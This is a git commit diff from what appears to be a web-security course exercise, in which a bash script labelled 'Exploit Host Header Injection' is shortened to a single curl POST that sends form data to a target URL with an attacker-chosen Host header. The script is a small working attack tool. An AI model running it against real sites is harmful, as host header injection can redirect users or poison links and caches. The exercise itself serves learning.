4eb86b9ea6b23e20eeb30ad6b7ca9595bea42afa
jdidi422 <rassiljdidi3@gmail.com>
2026-01-14 14:33:25 +0100

    1

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,20 +1,2 @@
 #!/bin/bash
-
-# ARGUMENTS
-NEW_HOST="$1"
-TARGET_URL="$2"
-FORM_DATA="$3"
-
-# Check arguments
-if [ "$#" -ne 3 ]; then
-    echo "Usage: $0 <new_host> <target_url> <form_data>"
-    exit 1
-fi
-
-# Exploit Host Header Injection
-curl -s \
-     -X POST "$TARGET_URL" \
-     -H "Host: $NEW_HOST" \
-     -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "$FORM_DATA"
-
+curl  -X POST "$2" -H "Host: $1" -d "$3"
